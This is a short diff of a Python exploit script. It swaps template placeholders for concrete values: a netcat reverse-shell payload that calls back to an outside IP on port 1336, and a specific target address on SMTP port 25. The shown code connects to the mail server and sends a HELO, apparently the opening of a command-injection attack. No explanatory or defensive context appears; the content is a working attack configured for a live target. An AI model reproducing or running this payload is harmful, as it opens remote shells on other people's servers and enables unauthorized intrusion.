@@ -11,12 +11,12 @@
 
 import socket
 
-payload = b"/bin/nc <ATTACKER_IP> <LISTENING PORT> -e /bin/sh;" #Change HERE
+payload = b"/bin/nc 154.49.137.21,1336 -e /bin/sh;" #Change HERE
 
 
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 sock.settimeout(20)
-sock.connect(("<TARGET_IP>",<TARGET_PORT>)) #Change HERE
+sock.connect(("72.167.42.186",25)) #Change HERE
 print(sock.recv(1024))
 sock.send(b"helo test\r\n")
 print(sock.recv(1024))
